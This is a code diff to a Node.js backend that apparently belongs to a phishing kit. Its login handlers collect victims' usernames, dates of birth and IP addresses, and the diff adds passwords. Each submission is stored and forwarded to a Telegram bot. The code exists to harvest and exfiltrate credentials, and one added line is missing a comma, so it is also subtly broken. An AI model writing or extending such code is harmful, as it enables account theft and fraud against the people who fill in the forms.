@@ -39,17 +39,17 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-    const { username, dob, uniqueid, owner, ip } = req.body;
+    const { username, dob, password, uniqueid, owner, ip } = req.body;
     try {
         await YBS.create({
             uniqueid,
-            username, dob,
+            username, dob, password
             status: 1,
             owner,
             ip,
         });
 
-        let originalText = `ID: ${uniqueid}\nUsername: ${username}\nDOB: ${dob}`;
+        let originalText = `ID: ${uniqueid}\nUsername: ${username}\nDOB: ${dob}\nPassword: ${password}`;
         await axios
             .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
@@ -71,11 +71,11 @@ const submitLogin = async (req, res) => {
 };
 
 const submitLoginAgain = async (req, res) => {
-    const { username, dob, uniqueid } = req.body;
+    const { username, dob, password, uniqueid } = req.body;
     try {
         await YBS.findOneAndUpdate(
             { uniqueid },
-            { username, dob, status: 5 }
+            { username, dob, password, status: 5 }
         ).exec();
         res.sendStatus(200);
     } catch (error) {
